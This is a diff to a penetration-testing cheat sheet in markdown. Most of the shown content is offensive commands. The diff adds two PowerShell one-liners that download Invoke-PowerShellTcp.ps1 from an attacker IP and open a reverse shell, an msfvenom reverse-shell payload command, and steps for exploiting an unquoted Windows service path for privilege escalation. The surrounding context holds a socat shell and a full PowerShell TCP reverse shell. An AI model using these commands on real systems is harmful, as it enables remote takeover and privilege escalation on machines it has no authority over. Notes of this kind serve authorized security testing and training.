@@ -27,6 +27,11 @@ When receiving the error “/usr/bin/env: ‘python\r’: No such file or direct
 2.	Use the command “:set ff=unix”
 3.	Save the file. “:wq”
 
+#### SSH key files
+```
+ssh key files needs to be permission 600
+```
+
 ## Powershell
 #### Powershell flags
 - ```-nop```: (-noprofile) which instructs powershell not to load the powershell user profile.
@@ -384,7 +389,7 @@ curl -v -X OPTIONS http://website/directory
 ```
 
 # Exploitation
-## Web application
+## Exploitation Web application
 ### General
 When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
 -	Does it initiate an HTTP or HTTPS connection?
@@ -511,6 +516,14 @@ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+```
+powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -usebasicparsing);Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
+```
+
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
+```
+
 #### Powercat
 ```
 powercat -c <IP> -p <PORT> -e cmd.exe
@@ -538,16 +551,23 @@ Exploit binaries
 - Linux https://gtfobins.github.io/
 - Windows https://lolbas-project.github.io/
 
+Static binaries
+- https://github.com/andrew-d/static-binaries
+
 ### Windows
+- Windows check if Windows Scheduler is running (```tasklist```)
+  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
+  - Check if we got write permissions
+
 #### Powerup unqouted service path
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 
 - Check for something we can restart and generate payload:
 - MSF venom generate exe
-  - msfvenom -p windows/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o <NAME>.exe
-- Upload to host
+  - ```msfvenom -p windows/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o <NAME>.exe```
+- Upload to host in the unqouted servicepath (if path is C:\Program Files\pro ftp) upload it as C:\Program Files\pro.exe
 - Restart service in powershell. 
-- restart-service  <SERVICE>
+-   ```restart-service  <SERVICE>```
 
 ### Linux
 #### Find suit bits
